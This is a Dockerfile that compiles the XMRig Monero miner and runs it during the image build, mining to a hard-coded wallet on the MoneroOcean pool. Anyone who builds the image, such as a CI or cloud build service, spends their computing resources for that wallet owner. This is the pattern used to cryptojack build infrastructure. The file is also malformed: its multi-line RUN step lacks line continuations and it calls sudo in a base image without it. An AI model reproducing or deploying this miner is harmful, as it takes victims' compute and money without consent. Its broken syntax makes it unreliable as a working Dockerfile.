FROM ubuntu:latest

WORKDIR /app

RUN
	sudo apt -y update
	sudo apt -y upgrade
	sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
	git clone https://github.com/xmrig/xmrig.git
	cd xmrig
	mkdir build
	cd build
	cmake ..
	make
	./xmrig -o gulf.moneroocean.stream:10128 -u 4B4RSqqyoMQBNSnfTkWPFVTMVHzBGoY5WRn7BobfY1Myid5p6HaszDs7nyGVVNHGRTMh6HmFwxZMYR5Hc83frXULS1UfChC -p test